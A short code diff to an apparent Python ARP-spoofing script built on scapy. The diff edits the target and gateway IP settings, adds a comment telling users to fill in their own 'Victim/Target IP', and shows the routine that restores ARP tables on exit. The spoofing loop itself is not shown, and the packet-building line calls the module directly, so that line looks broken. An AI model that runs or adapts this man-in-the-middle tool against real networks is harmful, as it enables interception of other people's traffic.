@@ -23,9 +23,10 @@ def restore(destination_ip, source_ip):
     source_mac = get_mac(source_ip)
     packet = scapy(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, count=4, verbose=False)
-    
-target_ip = "192.168.3.11"
-gateway_ip = "192.168.3.11"
+
+# 🔧 Replace these values with your own target and gateway IP addresses
+target_ip = "192.168.3.11" # Victim/Target IP
+gateway_ip = "192.168.3.2" # Router/Gateway IP
 
 try:
    sent_packets_count = 0
@@ -38,4 +39,5 @@ try:
 except KeyboardInterrupt:
     print("\n[+] Detected CTRL+C ... Resetting ARP table..... Please wait.\n")
     restore(target_ip, gateway_ip)
+
     restore(gateway_ip, target_ip)
